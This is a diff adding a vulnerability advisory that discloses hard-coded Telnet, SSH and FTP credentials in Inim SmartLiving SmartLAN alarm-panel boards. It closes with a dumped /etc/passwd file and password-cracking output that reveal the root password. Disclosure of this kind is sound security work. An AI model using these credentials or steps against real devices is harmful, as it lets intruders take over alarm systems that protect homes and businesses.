@@ -1,0 +1,79 @@
+# Exploit Title: Inim Electronics Smartliving SmartLAN 6.x - Hard-coded Credentials
+# Exploit Author: LiquidWorm
+# Date: 2019-12-09
+# Product web page: https://www.inim.biz
+# Link: https://www.inim.biz/en/antintrusion-control-panels/home-automation/control-panel-smartliving?  
+# Advisory ID: ZSL-2019-5546
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5546.php
+
+Inim Electronics Smartliving SmartLAN/G/SI <=6.x Hard-coded Credentials
+
+
+Vendor: INIM Electronics s.r.l.
+Product web page: https://www.inim.biz
+Link: https://www.inim.biz/en/antintrusion-control-panels/home-automation/control-panel-smartliving?
+Affected version: <=6.x
+Affected models: SmartLiving 505
+                 SmartLiving 515
+                 SmartLiving 1050, SmartLiving 1050/G3
+                 SmartLiving 10100L, SmartLiving10100L/G3
+
+Summary: SmartLiving anti-intrusion control panel and security system provides
+important features rarely found in residential, commercial or industrial application
+systems of its kind. This optimized-performance control panel provides first-rate
+features such as: graphic display, text-to-speech, voice notifier, flexible hardware,
+end-to-end voice transmission (voice-on-bus), IP connectivity.
+
+SMARTLAN/SI:
+The system-on-chip platform used in the SmartLAN/SI accessory board provides point-to-point
+networking capability and fast connectivity to the Internet. Therefore, it is possible
+to set up a remote connection and program or control the system via the SmartLeague
+software application. In effect, the SmartLAN/SI board grants the same level of access
+to the system as a local RS232 connection.
+
+SMARTLAN/G:
+The SmartLAN/G board operates in the same way as the SmartLAN/SI but in addition provides
+advanced remote-access and communication functions. The SmartLAN/G board is capable of
+sending event-related e-mails automatically. Each e-mail can be associated with a subject,
+an attachment and a text message. The attachment can be of any kind and is saved to an
+SD card. The message text can contain direct links to domains or IP addressable devices,
+such as a security cameras. In addition to e-mails, the SmartLAN/G board offers users
+global access to their control panels via any Internet browser accessed through a PC,
+PDA or Smartphone. In fact, the SmartLAN/G has an integrated web-server capable of
+distinguishing the means of connection and as a result provides an appropriate web-page
+for the tool in use. Smartphones can control the system in much the same way as a
+household keypad, from inside the house or from any part of the world.
+
+Desc: The devices utilizes hard-coded credentials within its Linux distribution image.
+These sets of credentials (Telnet, SSH, FTP) are never exposed to the end-user and cannot
+be changed through any normal operation of the smart home device. Attacker could exploit
+this vulnerability by logging in and gain system access.
+
+Tested on: GNU/Linux 3.2.1 armv5tejl
+           Boa/0.94.14rc21
+           BusyBox v1.20.2
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5546
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5546.php
+
+
+06.09.2019
+
+--
+
+
+# cat /etc/passwd
+root:$1$$uqbusDeGY2YWqg.T2S1100:0:0:administrator:/:/bin/sh
+nobody:*:254:254:nobody:/var/empty:/bin/sh
+logout:gfr8cijmRSDck:498:506:logout:/:
+
+# john --show /etc/passwd 
+root:pass:0:0:administrator:/:/bin/sh
+logout:logout:498:506:logout:/:
+
+2 password hashes cracked, 0 left
